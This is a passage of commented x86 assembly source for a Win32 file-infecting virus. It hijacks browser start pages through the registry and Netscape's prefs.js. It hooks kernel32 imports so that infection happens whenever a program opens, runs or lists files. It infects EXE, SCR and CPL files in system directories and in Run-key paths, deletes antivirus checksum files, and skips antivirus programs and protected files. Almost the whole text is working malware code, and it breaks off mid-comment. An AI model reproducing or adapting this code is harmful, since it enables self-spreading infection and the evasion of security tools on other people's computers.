ASC_RegSetValueExA      db      'RegSetValueExA',0
ASC_RegEnumKeyA         db      'RegEnumKeyA',0
ASC_RegQueryValueExA    db      'RegQueryValueExA',0
ASC_RegEnumValueA       db      'RegEnumValueA',0
                        db      0

HandleADVAPI32          dd      0
org HandleADVAPI32
HandleOpenedKey         dd      0
RVA_RegistryFunctions   label   dword
RVA_RegOpenKeyExA       dd      0
RVA_RegCloseKey         dd      0
RVA_RegSetValueExA      dd      0
RVA_RegEnumKeyA         dd      0
RVA_RegQueryValueExA    dd      0
RVA_RegEnumValueA       dd      0

;; This function modifies the start page of Internet Explorer. The easiest
;; one, not as much as complicated to get as the Netscape one.
ModifyInternetExplorer proc
                lea     eax, [ebp+HandleOpenedKey]
                push    eax
                push    KEY_ALL_ACCESS
                push    0
                lea     eax, [ebp+IExplorerKey]
                push    eax
                push    HKEY_CURRENT_USER
                call    dword ptr [ebp+RVA_RegOpenKeyExA]
        ; This just opened:
        ; HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main
                or      eax, eax  ; Error?
                jnz   @@End       ; End if error

                push    LongNombrePagina  ; Store the size of the new value
                lea     eax, [ebp+Pagina] ; Store the address
                push    eax
                push    1                 ; Some necessary values
                push    0
                lea     eax, [ebp+IExplorerValue] ; Store the address of the
                push    eax                       ; value
                push    dword ptr [ebp+HandleOpenedKey] ; Now the handle...
                call    dword ptr [ebp+RVA_RegSetValueExA] ; ...and change it
                ; If error, we close. If not, we close :)

                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegCloseKey] ; Close key handle
       @@End:   ret
ModifyInternetExplorer endp

;; This is the page to set
Pagina          db      'http://www.thehungersite.com',0
                LongNombrePagina equ   $ - offset Pagina

;; This is the path into the registry to set the page to. I don't think this
;; key will change in the future, since many programs use it to set its own
;; start page.
IExplorerKey    db      'Software\Microsoft\Internet Explorer\Main',0
IExplorerValue  db      'Start Page',0

;; The difficult one. Well, it's not difficult when you see it made, but it's
;; complicated to get. Since there isn't any registry key to set the start
;; page, I had to search the autoconfig (PREFS.JS) and invent a manner of
;; modifying it without many problems. I tried to map that file and move the
;; whole text after the java function that sets the start page, to make a hole
;; big enough to set the function (if the old start page were bigger, you can
;; fill with spaces), but that was a pain in the ass. Then, after a good men-
;; tal exercise :), I tried the trick I use now. Since the file is a java file
;; setting values, if you add a line at the end setting a new value, you over-
;; write the last value. It's like doing MOV AX,1234 and later MOV AX,2345 (or
;; the C equivalent).
ModifyNetscapeNavigator proc
      ; This variable is used for RegEnumKeyA
                mov     dword ptr [ebp+SubkeyIndex], 0
     @@LoopOpeningSubkeys:
                mov     byte ptr [ebp+NetscapeKeyEnd-1], 0 ; Put this to 0
                lea     eax, [ebp+HandleOpenedKey]
                push    eax
                push    KEY_ALL_ACCESS
                push    0
                lea     eax, [ebp+NetscapeKey]
                push    eax
                push    HKEY_LOCAL_MACHINE
                call    dword ptr [ebp+RVA_RegOpenKeyExA]
        ; Here, we opened the key:
        ; HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator\Users'

                or      eax, eax    ; Error?
                jnz   @@End         ; Exit, then

        ; We get the subkeys in the recently opened key. That are the users
        ; registered on the Netscape Navigator. It's like making FindFirstFile
        ; and FindNextFile in a directory, but easier, since we use an index
        ; to get the relative key.
                push    80h
                lea     eax, [ebp+ReceivingBuffer]
                push    eax
                push    dword ptr [ebp+SubkeyIndex]
                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegEnumKeyA]
                or      eax, eax   ; Error getting subkey?
                jnz   @@EndOfKeys  ; If error, exit

                mov     byte ptr [ebp+NetscapeKeyEnd-1], '\' ; Put this there
                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegCloseKey] ; Close key (I know
                                            ; that maybe is a foolness, but
                                            ; I did it by a reason. I don't
                                            ; remember it, but there is a
                                            ; reason :).
                lea     eax, [ebp+HandleOpenedKey]
                push    eax
                push    KEY_ALL_ACCESS
                push    0
                lea     eax, [ebp+NetscapeKey]
                push    eax
                push    HKEY_LOCAL_MACHINE
                call    dword ptr [ebp+RVA_RegOpenKeyExA] ; Open the retrieved
                or      eax, eax                          ; subkey
                jnz   @@End

                mov     dword ptr [ebp+LongBuffer], 80h
                lea     eax, [ebp+LongBuffer]
                push    eax
                lea     eax, [ebp+ReceivingBuffer]
                push    eax
                push    0
                push    0
                lea     eax, [ebp+NetscapeValue]
                push    eax
                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegQueryValueExA]
         ; Now we get the value of "DirRoot", where the directory of this user
         ; is specified.
                or      eax, eax  ; Error?
                jnz   @@EndOfKeys ; Exit, then

                call    ModifyPrefs  ; Add the "magic" line to PREFS.JS

                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegCloseKey] ; Close the key
                inc     dword ptr [ebp+SubkeyIndex] ; Increase number for
                                                    ; enumerating function
                jmp   @@LoopOpeningSubkeys     ; Loop

 @@EndOfKeys:   push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegCloseKey] ; Close Netscape key
       @@End:   ret           ; Return
ModifyNetscapeNavigator endp

SubkeyIndex     dd      0
LongBuffer      dd      0
LongBuffer2     dd      0

LineToAddToPrefs db     'user_pref("browser.startup.homepage", "http://www.thehungersite.com");',0dh,0ah
                SizeLineToAdd   equ     $ - offset LineToAddToPrefs

NetscapePrefsFile db    '\prefs.js',0
                SizeNamePrefs   equ     $ - offset NetscapePrefsFile

NetscapeKey     db      'Software\Netscape\Netscape Navigator\Users\'
NetscapeKeyEnd  label   byte
ReceivingBuffer db      80h dup (0)
NetscapeValue   db      'DirRoot',0

;; This function adds the line
;; user_pref("browser.startup.homepage", "http://www.thehungersite.com");
;; to PREFS.JS. In this way, the next time Netscape Navigator is runned, the
;; start page will be set to http://www.thehungersite.com
ModifyPrefs     proc
                mov     ecx, dword ptr [ebp+LongBuffer]
                lea     edi, [ebp+ReceivingBuffer]
                dec     ecx
                add     edi, ecx
                lea     esi, [ebp+NetscapePrefsFile]
                mov     ecx, SizeNamePrefs
                cld
                rep     movsb ; Create a full path to PREFS.JS

                push    0
                push    0
                push    3
                push    0
                push    0
                push    0c0000000h
                lea     eax, [ebp+ReceivingBuffer]
                push    eax
                call    dword ptr [ebp+RVA_CreateFileA] ; Open PREFS.JS
                inc     eax
                jz    @@End   ; If error, exit
                dec     eax
                mov     [ebp+FileHandle], eax
                push    2 ;Relative pointer position (same as INT 21h/AH=42h!)
                push    0
                push    0
                push    eax
                call    dword ptr [ebp+RVA_SetFilePointer] ; Put the file
                                                        ; pointer at the end
                inc     eax
                jz    @@Close     ; If error, exit
                dec     eax
                push    0
                lea     eax, [ebp+LongBuffer]
                push    eax
                push    SizeLineToAdd
                lea     eax, [ebp+LineToAddToPrefs]
                push    eax
                push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_WriteFile] ; Write the line at the
                                                      ; end of the file
     @@Close:   push    dword ptr [ebp+FileHandle]
                call    dword ptr [ebp+RVA_CloseHandle] ; Close file hangle
       @@End:   ret         ; Return
ModifyPrefs     endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; PER-PROCESS RESIDENCY: SETTING AND INFECTION
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

ImageBase       dd      400000h

PatchImportDirectory proc
                db      0B8h ; MOV EAX,xxxxxxxx
ImageBase2      dd      400000h   ; Image base, set on infection time
                mov     ebx, [eax+3Ch]
                add     ebx, eax
                cmp     word ptr [ebx], 'EP' ; Check if PE header
                jnz   @@End                  ; If not, end
                mov     ecx, [ebx+84h] ; ECX=Size of import data
                mov     ebx, [ebx+80h]
                add     ebx, eax       ; EBX=RVA of import directory header
@@SearchModule: mov     esi, [ebx+0Ch]
                or      esi, esi
                jz    @@End
                add     esi, eax       ; ESI=RVA to the module name
 @@ToLowerCase: mov     edx, [esi]     ; Get the first four characters
                call    ToLower
                cmp     edx, 'nrek'    ; Is it 'kern'?
                jnz   @@NextModule     ; If not, it's not kernel32
                mov     edx, [esi+4]   ; Get next 4 chars
                call    ToLower
                cmp     edx, '23le'    ; 'el32'?
                jz    @@Found          ; If it is, we've found KERNEL32
 @@NextModule:  add     ebx, 14h       ; Next module in import directory
                sub     ecx, 14h       ; Have we finished?
                jnz   @@SearchModule   ; If not, scan next module
                jmp   @@End            ; Finish if we arrived to the end

      @@Found:  mov     esi, [ebx+10h] ; Get the RVA to the array of imported
                add     esi, eax       ; functions in ESI
                cld
                
                lea     ebx, [ebp+FunctionsToPatch]
  @@Loop_001:   mov     edi, ebx
                lodsd                  ; Load RVA to function
                or      eax, eax       ; If 0, error, so exit
                jz    @@End
                mov     ecx, 10h       ; Check that address with the ones got
                repnz   scasd          ; directly from KERNEL32
                jnz   @@Loop_001
                or      ecx, ecx
                jnz   @@Next
                lea     eax, [esi-4]
                mov     [ebp+ExitProcessInImport], eax
              ;  jmp   @@Loop_001
       @@Next:  sub     edi, ebx       ; If someone coincides, patch it with
                mov     eax, [ebp+edi+FunctionsAddress-4] ; ours
                add     eax, ebp

                pushad
                mov     dword ptr [ebp+DwordToWrite], eax
                push    0
                push    4
                lea     eax, [ebp+DwordToWrite]
                push    eax
                lea     eax, [esi-4]
                push    eax
                call    dword ptr [ebp+RVA_GetCurrentProcess]
                push    eax
                call    dword ptr [ebp+RVA_WriteProcessMemory]
              ;  mov     [esi-4], eax
                jmp   @@Loop_001       ; Next function in the import array
       @@End:   ret
PatchImportDirectory endp

DwordToWrite    dd      0

FunctionsAddress label  dword
dd      offset My_GetProcAddress       ; This ones are the addresses to the
dd      offset My_CreateFileA          ; per-process functions. This addresses
dd      offset My_CreateProcessA       ; plus the delta offset are stored into
dd      offset My_FindFirstFileA       ; the array of imported functions to
dd      offset My_FindNextFileA        ; patch them, so if the host call any
dd      offset My_GetFileAttributesA   ; of this functions the virus takes
dd      offset My_SetFileAttributesA   ; the control and performs the infec-
dd      offset My_GetFullPathNameA     ; tion activities.
dd      offset My_MoveFileA
dd      offset My_CopyFileA
dd      offset My_DeleteFileA
dd      offset My_WinExec
dd      offset My__lopen
dd      offset My_MoveFileExA
dd      offset My_OpenFile
dd      offset My_ExitProcess

;,,,,,,,,,,,,,,,,,,,,,,,,,
;; PER-PROCESS FUNCTIONS ;
;'''''''''''''''''''''''''
GetDelta        proc
                mov     eax, 12345678h ; This is set on run-time, at the
                org     $-4            ; beginning. It's shorter than making
DeltaOffset2    dd      0              ; a CALL/POP/SUB in every function
                ret
GetDelta        endp


; GetProcAddress: Patching this we ensure that the host receives our function
;                 address rather than the KERNEL32 one. In this way, if
;                 GetProcAddress is used over one of the patched functions to
;                 call that address directly, it'll call our function first.
My_GetProcAddress       proc
                        call    GetDelta ; EAX=Delta offset
                        push    ecx      ; Save ECX
                        add     eax, offset @@ReturnHere ; Calculate return
                                                         ; address
                        mov     ecx, eax ; Put it on ECX...
                        xchg    eax, [esp+4] ; ...and substitute the return
                                             ; into the stack by ours.
                        mov     [ecx+1], eax ; Save the real return address
                                             ; in [ReturnGetProcAddress]
                        pop     ecx       ; Restore ECX
                        call    GetDelta  ; Get delta in EAX...
                        mov     eax, [eax+RVA_GetProcAddress] ; and jump to
                        jmp     eax           ; GetProcAddress, but return...
                                         ; ...here!
        @@ReturnHere:   db      68h
ReturnGetProcAddress    dd      0        ; Push return to host (set before)
                        or      eax, eax ; EAX=0?
                        jz    @@Return   ; Error, so return
                        pushad           ; Save all
                        push    eax      ; Save function address
                        call    GetDelta
                        xchg    ebp, eax ; EBP=Delta offset
                        pop     eax      ; Restore function address
                        lea     esi, [ebp+RVA_GetProcAddress]
                                              ; ESI=Begin address of functions
                        lea     edi, [ebp+RVA_GetProcAddress+10h*4]
                                              ; EDI=End address of functions          
                        mov     ebx, esi
                        xchg    ecx, eax
           @@Loop_GPA:  lodsd            ; Load first RVA
                        cmp     eax, ecx ; Compare the kernel returned RVA
                                         ; with the RVA that we got scanning
                                         ; the kernel at first
                        jnz   @@Next_GPA ; If it isn't equal, jump
                        sub     esi, ebx ; Put in ESI the address of the per-
                        add     esi, ebp ; process function
                        mov     eax, [esi+FunctionsAddress+4] ; Load it
                        mov     [esp+1Ch], eax ; Substitute RVA to function
                                               ; by our function address
                        jmp   @@Return2  ; End
           @@Next_GPA:  cmp     esi, edi ; Already at the end of the array?
                        jnz   @@Loop_GPA ; If not, loop
            @@Return2:  popad            ; Restore registers
            @@Return:   ret ;Return to host with the substituted RVA (if done)
My_GetProcAddress       endp

;; CreateFileA: Infection on opening
My_CreateFileA          proc
                        call    GetDelta  ; EAX=Delta offset
                        mov     eax, [eax+RVA_CreateFileA] ; EAX=RVA to func.
                    ;    jmp     InfectByPerProcess    ; Jump to common part
My_CreateFileA          endp

InfectByPerProcess      proc
                        push    eax      ; Save RVA to function
                        pushad
                        call    GetDelta
                        xchg    ebp, eax ; EBP=Delta offset
                        mov     ebx, [esp+28h] ; EBX=RVA to the name of the
                                               ; file to operate
InfectThisPath:         lea     eax, [ebp+FindFileField] ; EAX=RVA to data
                                                         ; storage
                        push    eax   ; Store it to use FindFirstFile
                        push    ebx   ; Store the RVA to the name of the file
                        call    dword ptr [ebp+RVA_FindFirstFileA] ; Find it
                        inc     eax
                        jz    @@Return ; If error (not found), return
                        dec     eax
                        mov     esi, ebx
                        lea     edi, [ebp+FileName]
                        cld
                 @@LoopCopy:
                        movsb
                        cmp     byte ptr [edi-1], 0
                        jnz   @@LoopCopy

                        push    eax    ; Save handle
                        call    InfectFile  ; Infect that file using the data
                                            ; in FindFileField
                        call    dword ptr [ebp+RVA_FindClose] ; Close the
                                                              ; pushed handle
         @@Return:      popad    ; Restore regs
                        ret      ; Jump to kernel function
InfectByPerProcess      endp

InfectDirectly          proc
                        pushad
                        jmp     InfectThisPath
InfectDirectly          endp

;; CreateProcessA: Infection on execution
My_CreateProcessA       proc
                        call    GetDelta 
                        mov     eax, [eax+RVA_CreateProcessA]
                        jmp     InfectByPerProcess
My_CreateProcessA       endp             ; EAX=RVA to Kernel32.CreateProcessA

FindFirstIdent  db      0 ; This is used to identify FindFirstFileA or
                          ; FindNextFileA

; FindNextFileA: Infection by file enumeration
My_FindNextFileA        proc
                        call    GetDelta  ; EAX=Delta offset
                        mov     byte ptr [eax+FindFirstIdent], 0
                        jmp     Common_FindFile 
My_FindNextFileA        endp

My_FindFirstFileA       proc
                        call    GetDelta  ; EAX=Delta offset
                        mov     byte ptr [eax+FindFirstIdent], 1
       Common_FindFile: add     eax, offset @@ReturnHere ; EAX=Return address
                                          ; for calling the KERNEL32 function
                                          ; and returning here and not to the
                                          ; host
                        push    ecx       ; Save ECX
                        mov     ecx, eax      ; ECX=Return address
                        xchg    eax, [esp+4]  ; Set it onto stack and EAX is
                                              ; now the return address to the
                                              ; host
                        mov     [ecx+1], eax  ; Save it in @@ReturnHere+1
                        mov     eax, [esp+0Ch] ; We put the buffer address...
                        mov     [ecx+0Dh], eax ; ...here
                        pop     ecx      ; We restore ECX
                        call    GetDelta ; EAX = Delta offset
                        cmp     byte ptr [eax+FindFirstIdent], 1
                        jz    @@PutFindFirst   ; If =1, call to FindFirstFileA
       @@PutFindNext:   mov     eax, [eax+RVA_FindNextFileA]
                        jmp     eax   ; Call FindNextFileA
       @@PutFindFirst:  mov     eax, [eax+RVA_FindFirstFileA]
                        jmp     eax   ; Call FindFirstFileA
        @@ReturnHere:   db      68h ; PUSH Value
                        dd      0        ; +1
                        pushad           ; +5  ; Save registers
                        inc     eax      ; +6  ; Error?
                        jnz   @@ItsOK    ; +7  ; If not, jump
                        dec     eax      ; +9  ; Restore EAX
                        jmp   @@Return   ; +A  ; Return to host
          @@ItsOK:      db      0BEh ; MOV ESI,Value   ; +C ; ESI=Address to
          @@ESIValue:   dd      0                      ; +D ;     data field
                        call    GetDelta
                        xchg    ebp, eax ; EBP=Delta offset
                        lea     edi, [ebp+FindFileField] ; EDI=Our data field
                        mov     ecx, FindFileFieldSize ; Copy the data retrie-
                        cld                      ; ved by the function to our
                        rep     movsb            ; data field
                        dec     byte ptr [ebp+InfectFileNow] ; Decrease infec-
                                                        ; tion counter
                        jnz   @@Return           ; If it's not 0, don't infect
                        mov     byte ptr [ebp+InfectFileNow], 3 ; Set this to
                                                 ; 3, to infect only one of
                                                 ; every three files listed by
                                                 ; this function
                        call    InfectFile    ; Infect file
              @@Return: popad
                        ret             ; Restore regs and return
My_FindFirstFileA       endp

InfectFileNow   db      3  ; Infection counter

; GetFileAttributesA: Infection by getting attributes
My_GetFileAttributesA   proc
                        call    GetDelta
                        mov     eax, [eax+RVA_GetFileAttributesA]
                        jmp     InfectByPerProcess
My_GetFileAttributesA   endp         ; EAX=RVA to Kernel32.GetFileAttributesA

; SetFileAttributesA: Infection by setting attributes
My_SetFileAttributesA   proc
                        call    GetDelta
                        mov     eax, [eax+RVA_SetFileAttributesA]
                        jmp     InfectByPerProcess
My_SetFileAttributesA   endp         ; EAX=RVA to Kernel32.SetFileAttributesA

; GetFullPathNameA: Infection by getting the full path name of a file
My_GetFullPathNameA     proc
                        call    GetDelta
                        mov     eax, [eax+RVA_GetFullPathNameA]
                        jmp     InfectByPerProcess
My_GetFullPathNameA     endp         ; EAX=RVA to Kernel32.GetFullPathNameA

; MoveFileA: Infection by moving a file
My_MoveFileA            proc
                        call    GetDelta
                        mov     eax, [eax+RVA_MoveFileA]
                        jmp     InfectByPerProcess
My_MoveFileA            endp         ; EAX=RVA to Kernel32.MoveFileA

; CopyFileA: Infection by copying a file
My_CopyFileA            proc
                        call    GetDelta
                        mov     eax, [eax+RVA_CopyFileA]
                        jmp     InfectByPerProcess
My_CopyFileA            endp         ; EAX=RVA to Kernel32.CopyFileA

; DeleteFileA: Infection by deleting a file.
; Although it could seem stupid, remember the Recycle Bin!
My_DeleteFileA          proc
                        call    GetDelta
                        mov     eax, [eax+RVA_DeleteFileA]
                        jmp     InfectByPerProcess
My_DeleteFileA          endp         ; EAX=RVA to Kernel32.DeleteFileA

; WinExec: Infection by execution (old Win32, for compatibility with Win16)
My_WinExec              proc
                        call    GetDelta
                        mov     eax, [eax+RVA_WinExec]
                        jmp     InfectByPerProcess
My_WinExec              endp         ; EAX=RVA to Kernel32.WinExec

; _lopen: Infection by opening (old Win32, for compatibility with Win16)
My__lopen               proc
                        call    GetDelta
                        mov     eax, [eax+RVA__lopen]
                        jmp     InfectByPerProcess
My__lopen               endp         ; EAX=RVA to Kernel32._lopen

; MoveFileExA: Infection by moving (extended, but the same as MoveFileA)
My_MoveFileExA          proc
                        call    GetDelta
                        mov     eax, [eax+RVA_MoveFileExA]
                        jmp     InfectByPerProcess
My_MoveFileExA          endp         ; EAX=RVA to Kernel32.MoveFileExA

; OpenFile: Infection by opening (old Win32, earlier than CreateFileA)
My_OpenFile             proc
                        call    GetDelta
                        mov     eax, [eax+RVA_OpenFile]
                        jmp     InfectByPerProcess
My_OpenFile             endp         ; EAX=RVA to Kernel32.OpenFile

My_ExitProcess          proc     ; Patch ExitProcess just in case the applica-
                        jmp     LastFunction ; tion calls it without making an
My_ExitProcess          endp                ; explicit call (and thus it can't
                                            ; be patched)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; RUN-TIME INFECTION
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; This will infect one file of each four in the current, windows and system
;; directory (as always). If the files AVP.CRC, ANTI-VIR.DAT, CHKLIST.MS or
;; IVB.NTZ are found, they'll be deleted. 
RuntimeInfection proc
                call    LoadSFCFunctions ; Load SFC.DLL library
                call    LoadIMAGEHLPFunctions ; Load IMAGEHLP.DLL library

                call    LoadRegistryFunctions
                or      eax, eax
                jz    @@NoRegistry

                ;;; Infectar directamente varios paths
                ;;; de programas instalados
; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\
; \WinZip
; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
                mov     dword ptr [ebp+SubkeyIndex], 0

                mov     byte ptr [ebp+RunKeyEnd-1], 0
                lea     eax, [ebp+HandleOpenedKey]
                push    eax
                push    KEY_ALL_ACCESS
                push    0
                lea     eax, [ebp+RunKey]
                push    eax
                push    HKEY_LOCAL_MACHINE
                call    dword ptr [ebp+RVA_RegOpenKeyExA]
                or      eax, eax
                jnz   @@EndOfKeys
      @@LoopSubkeys:
                lea     eax, [ebp+LongBuffer]
                mov     dword ptr [eax], 80h
                push    eax
                lea     eax, [ebp+Directory2]
                push    eax
                push    0
                push    0
                lea     eax, [ebp+LongBuffer2]
                mov     dword ptr [eax], 80h
                push    eax
                lea     eax, [ebp+Directory1]
                push    eax
                push    dword ptr [ebp+SubkeyIndex]
                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegEnumValueA]
                or      eax, eax  ; Error?
                jnz   @@EndOfKeys ; Exit, then

                lea     esi, [ebp+Directory2]
                mov     ecx, 80h
          @@LoopSearchExtension:
                cmp     byte ptr [esi], 0
                jz    @@NextSubkey
                dec     ecx
                jz    @@NextSubkey
                inc     esi
                mov     edx, [esi]
                call    ToLower
                cmp     edx, 'exe.'
                jnz   @@LoopSearchExtension
                cmp     byte ptr [esi+4], 0
                jz    @@NameOK
                cmp     byte ptr [esi+4], 20h
                jnz   @@LoopSearchExtension
                mov     byte ptr [esi+4], 0
          @@NameOK:
                lea     ebx, [ebp+Directory2]
                call    InfectDirectly

       @@NextSubkey:               
                inc     dword ptr [ebp+SubkeyIndex]
                jmp   @@LoopSubkeys

    @@EndOfKeys2:
                push    dword ptr [ebp+HandleOpenedKey]
                call    dword ptr [ebp+RVA_RegCloseKey]
    @@EndOfKeys:
                push    dword ptr [ebp+HandleADVAPI32]
                call    dword ptr [ebp+RVA_FreeLibrary]

     @@NoRegistry:
                call    InfectCurrentDir ; Self-explanatory ;)
                lea     eax, [ebp+Directory2]
                push    eax
                push    80h
                call    dword ptr [ebp+RVA_GetCurrentDirectoryA] ; Save the
                                         ; current directory
                call    InfectWindowsDir ; Infect the Win dir
                call    InfectSystemDir  ; Infect windows\system dir
                lea     eax, [ebp+Directory2] ; Restore the current dir
                push    eax
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                cmp     dword ptr [ebp+HandleSFC], 0
                jz    @@Next1
                push    dword ptr [ebp+HandleSFC]
                call    dword ptr [ebp+RVA_FreeLibrary]
         @@Next1:
                cmp     dword ptr [ebp+HandleIMAGEHLP], 0
                jz    @@Next2
                push    dword ptr [ebp+HandleIMAGEHLP]
                call    dword ptr [ebp+RVA_FreeLibrary]
         @@Next2:
                xor     eax, eax
                mov     dword ptr [ebp+HandleSFC], eax
                mov     dword ptr [ebp+HandleIMAGEHLP], eax
                mov     dword ptr [ebp+RVA_CheckSumMappedFile], eax
                mov     dword ptr [ebp+RVA_SfcIsFileProtected], eax
                ret                      ; Return
RuntimeInfection endp

RunKey          db      'Software\Microsoft\Windows\CurrentVersion\Run\'
RunKeyEnd       label byte
Directory1      db      80h dup (0)  ; Place to get the windows, etc. dirs
Directory2      db      80h dup (0)  ; Place to save the current directory

LoadRegistryFunctions proc
                lea     eax, [ebp+RegistryDLL]
                push    eax
                call    dword ptr [ebp+RVA_LoadLibraryA]
                or      eax, eax        ; Error?
                jz    @@Return          ; Exit, then
                mov     [ebp+HandleADVAPI32], eax  ; Save handle
                lea     esi, [ebp+ASC_RegistryFunctions] ; Names of functions
                lea     edi, [ebp+RVA_RegistryFunctions] ; Storage of RVAs
    @@NextRVA:  push    esi
                push    edi
                push    esi
                push    dword ptr [ebp+HandleADVAPI32]
                call    dword ptr [ebp+RVA_GetProcAddress] ; Get the address
                or      eax, eax              ; Error?
                jz    @@Return                ; Exit, then
                pop     edi
                pop     esi
                mov     dword ptr [edi], eax  ; Save RVA
                add     edi, 4
    @@LoopNextFunc:
                inc     esi                ; Next char
                cmp     byte ptr [esi], 0  ; End of name?
                jnz   @@LoopNextFunc       ; If not, continue increasing
                inc     esi                ; Jump over the 0
                cmp     byte ptr [esi], 0  ; Another 0?
                jnz   @@NextRVA            ; If not, continue getting names
                mov     eax, 1
    @@Return:   ret
LoadRegistryFunctions endp

InfectSystemDir proc
                mov     ebx, [ebp+RVA_GetSystemDirectoryA]
Common_InfectDir:                       ; EBX=RVA of GetSystemDirectory
                push    80h
                lea     eax, [ebp+Directory1]
                push    eax
                call    ebx     ; GetSystemDirectory or GetWindowsDirectory
                or      eax, eax ; If error, end
                jz    @@Return
                call    SetDirectory1 ; Set that directory
                call    InfectCurrentDir ; Infect the directory files
@@Return:       ret             ; Return
InfectSystemDir endp

InfectWindowsDir proc
                mov     ebx, [ebp+RVA_GetWindowsDirectoryA]
                jmp     Common_InfectDir  ; EBX=RVA of GetWindowsDirectory
InfectWindowsDir endp                     ; Jump to the common part of this
                                          ; function and the InfectSystemDir
                
SetDirectory1   proc
                lea     eax, [ebp+Directory1] ; Set the directory on this
                push    eax                   ; address (windows or system)
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                ret     ; Return
SetDirectory1   endp

InfectCurrentDir proc
                call    DeleteDATs     ; Delete some antivirus CRC protections
                lea     ecx, [ebp+FindFileMask1] ; ECX=RVA to *.EXE
                call    InfectCurrentDir2        ; Infect EXEs
                lea     ecx, [ebp+FindFileMask2] ; ECX=RVA to *.SCR
                call    InfectCurrentDir2        ; Infect SCRs
                lea     ecx, [ebp+FindFileMask3] ; ECX=RVA to *.CPL
                call    InfectCurrentDir2        ; Infect CPLs
                ret                    ; Return
InfectCurrentDir endp

InfectCurrentDir2 proc
                call    Random      ; Get a random counter to begin infection
                and     al, 3
                mov     [ebp+FileInfectionCounter], al
                lea     ebx, [ebp+FindFileField]
                push    ebx
                push    ecx
                call    dword ptr [ebp+RVA_FindFirstFileA] ; Find first file
                inc     eax         ; Error?
                jz    @@Fin0        ; Then, jump
                dec     eax
                mov     dword ptr [ebp+FindFileHandle], eax ; Save handle
@@InfectAgain:  cmp     byte ptr [ebp+InfectAllFiles], 1 ;For infect all files
                jz    @@InfectAll                ; instead of one of each four
                dec     byte ptr [ebp+FileInfectionCounter] ; Counter in -1?
                jns   @@DontInfect   ; If not, don't infect
                mov     byte ptr [ebp+FileInfectionCounter], 3 ;Set count to 3
@@InfectAll:    call    InfectFile   ; Infect the found file
@@DontInfect:   lea     ebx, [ebp+FindFileField] ; Get next file
                push    ebx
                push    dword ptr [ebp+FindFileHandle]
                call    dword ptr [ebp+RVA_FindNextFileA]
                or      eax, eax         ; If no error or more files, jump and
                jnz   @@InfectAgain      ; continue infection
                push    dword ptr [ebp+FindFileHandle] ; Close handle
                call    dword ptr [ebp+RVA_FindClose]
     @@Fin0:    ret             ; Return
InfectCurrentDir2 endp

FindFileHandle  dd      0
FileInfectionCounter db 0

;; InfectFile
;;------------
;; This function uses the data in FindFileField to infect the file that repre-
;; sents, so that's why in some parts of the virus I copy the data about the
;; file in that field before calling this.
InfectFile      proc
                cmp     dword ptr [ebp+FileSizeLow], 00002004h
                jb    @@End
                lea     ebx, [ebp+FileName] ; EBX=RVA to the file name
         ; This function checks if the file name begins with TB (ThunderByte),
         ; SC (Scan and similars, usually McCafÇ), F- (F-Potatoe), PA (Panda
         ; Antivirus), DR (DrWeb) or NO (Nod-Ice), or it has a V in its name
         ; (many antivirus programs have it: AVP, INVIRCIBLE, CPAV, etc.)
                call    CheckFileName
                jc    @@End  ; Carry Flag means that is a "forbidden" name,
                             ; so we exit if CF is set
                cmp     dword ptr [ebp+RVA_SfcIsFileProtected], 0 ; Could be
                                                            ; SFC.DLL loaded?
                jz    @@NoWin2000       ; If not, we're not in Win2000
                push    ebx
                push    0               ; Check file against Win2K protection
                call    dword ptr [ebp+RVA_SfcIsFileProtected]
                or      eax, eax        ; If 0, it isn't protected
                jnz   @@End       ; If not 0, it's protected, so don't infect
      @@NoWin2000:
                push    80h       ; Clear file attributes (remove a posible
                lea     ebx, [ebp+FileName]  ; read-only attribute). I haven't
                push    ebx       ; to save the old attributes coz they are
                call    dword ptr [ebp+RVA_SetFileAttributesA] ; saved in the
                                                    ; FindFileField structure
                call    OpenFile  ; Open file
                jc    @@End2      ; CF=We couldn't, so exit
                call    SaveDateTime ;Save date and time stamp. It's saved in
                                     ;the FindFileField structure, but I dunno
                                     ;why when I used that data the timestamp
                                     ;weren't restored correctly, and it was
                                     ;when I used this, so I use it.
                call    MapFile   ; Open a mapping over the file
                jc    @@End3      ; If we couldn't, exit
                     ; After this, the mapping address is stored in EAX and
                     ; [MappingAddress]
                mov     edi, eax  ; EDI=Mapping address
                cmp     word ptr [edi], 'ZM' ; Has the file executable struct?
                jnz   @@End4                 ; If not, exit
                mov     esi, [edi+3Ch]       ; Get PE header address
                cmp     esi, 2000h
                ja    @@End4        ; Maybe compressed DOS-EXE
                add     esi, edi
                cmp     word ptr [esi], 'EP' ; Is there a PE header?
                jnz   @@End4                 ; If not, exit

;; ESI=PE header address, EDI=Mapping address (beginning of file)

;; The way we infect the files:
;; 0) We check the last section. If it is .rsrc, then the file can be infec-
;;   ted. Otherwise, that last section must be .reloc, to be anulated. If that
;;   section isn't the .reloc section, the file can't be infected, since it
;;   could be infected already.
;; 1) The section .reloc (if exists) is anulated.
;; 2) If there isn't any reloc section, we create a new section if the PE
